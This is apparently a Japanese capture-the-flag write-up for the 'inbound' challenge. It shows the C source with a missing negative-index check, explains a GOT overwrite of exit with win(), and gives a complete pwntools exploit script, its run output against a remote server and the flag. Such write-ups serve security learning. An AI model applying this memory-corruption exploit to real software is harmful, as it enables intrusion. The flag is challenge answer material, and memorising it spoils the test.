# inbound

> inside-of-bounds

サーバー起こす系の問題

[inbound.tar.gz](https://alpacahack-prod.s3.ap-northeast-1.amazonaws
.com/7f6efa15-e66e-4412-9c77-36f1c3c20347/inbound.tar.gz)が提供される

```
inbound/
inbound/inbound
inbound/Dockerfile
inbound/main.c
inbound/compose.yml
```

main.c
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int slot[10];

/* Call this function! */
void win() {
  char *args[] = {"/bin/cat", "/flag.txt", NULL};
  execve(args[0], args, NULL);
  exit(1);
}

int main() {
  int index, value;
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);

  printf("index: ");
  scanf("%d", &index);
  if (index >= 10) {
    puts("[-] out-of-bounds");
    exit(1);
  }

  printf("value: ");
  scanf("%d", &value);

  slot[index] = value;

  for (int i = 0; i < 10; i++)
    printf("slot[%d] = %d\n", i, slot[i]);

  exit(0);
}
```

以下の部分に脆弱性がある
```c
printf("index: ");
scanf("%d", &index);
if (index >= 10) { // 上限チェックのみ
    puts("[-] out-of-bounds");
    exit(1);
}
// ...
slot[index] = value;
```

負の値のチェックが行われていないため`slot`よりも手前のアドレスに書き込み出来てしまう。

`exit`関数のGOT(Global Offset Table)に`win()`のアドレスを書き込むことにより`exit`が呼ばれた時に`win()`へジャンプしシェルコマンド(`/bin/cat /flag.txt`)が実行される。

おそらくメモリ構造は次のようになっている
```
[ .got.plt (exit@gotなど) ]  <-- 書き換え対象 (Target)
       ...
[ .bss / .data (slot配列) ]  <-- 基準点 (Base)
```

`slot`から見て`exit@got`は手前にあるためインデックスは負の数になる。

`slot`は`int`型配列なので、メモリアドレスの差分を4バイト(`sizeof(int)`)で割る必要がある。

$$
index = \frac{addr(exit@got) - addr(slot)}{4}
$$

エクスプロイトコード

```py
from pwn import *

# 1. 初期設定
elf = ELF('./inbound')
# io = process('./inbound')
io = remote(host, port)

# 2. アドレスの取得
addr_win = elf.symbols['win']      # 飛ばしたい先
addr_slot = elf.symbols['slot']    # 配列の先頭
addr_exit_got = elf.got['exit']    # 書き換え対象

log.info(f"win address: {hex(addr_win)}")
log.info(f"slot address: {hex(addr_slot)}")
log.info(f"exit@got: {hex(addr_exit_got)}")

# 3. インデックス（オフセット）の計算
# slot配列から exit@got までの距離を int(4byte) 単位で計算
index = (addr_exit_got - addr_slot) // 4
log.info(f"Calculated Index: {index}")

# 4. 攻撃実行
# index: 負のインデックスを送信
io.sendlineafter(b"index: ", str(index).encode())

# value: win関数のアドレスを送信（GOTをwinのアドレスで上書き）
io.sendlineafter(b"value: ", str(addr_win).encode())

# 5. フラグ取得
io.interactive()
```


```bash
> python solve.py
[*] '/home/saku0512/Desktop/CTF/Aplaca-Hack/inbound/inbound/inbound'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Opening connection to 34.170.146.252 on port 41379: Done
[*] win address: 0x4011d6
[*] slot address: 0x404060
[*] exit@got address: 0x404028
[*] Calculated index: -14
--- Flag Output ---
[*] Switching to interactive mode
slot[0] = 0
slot[1] = 0
slot[2] = 0
slot[3] = 0
slot[4] = 0
slot[5] = 0
slot[6] = 0
slot[7] = 0
slot[8] = 0
slot[9] = 0
Alpaca{p4rt14L_RELRO_1s_A_h4pPy_m0m3Nt}
[*] Got EOF while reading in interactive
```

flag: `Alpaca{p4rt14L_RELRO_1s_A_h4pPy_m0m3Nt}`
